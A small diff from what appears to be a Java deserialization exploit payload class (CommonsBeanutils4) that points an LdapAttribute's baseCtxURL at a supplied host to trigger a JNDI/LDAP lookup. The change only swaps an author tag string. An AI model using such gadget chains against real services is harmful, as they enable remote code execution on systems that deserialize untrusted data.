@@ -30,7 +30,7 @@ public class CommonsBeanutils4 implements ObjectPayload<Object> {
         Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(new Object[]{"name"});
 
         Reflections.setFieldValue(ldapAttribute, "baseCtxURL", host);
-        Reflections.setFieldValue(ldapAttribute, "rdn", new CompositeName(query + "//su18"));
+        Reflections.setFieldValue(ldapAttribute, "rdn", new CompositeName(query + "//nu1r"));
 
         final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
 
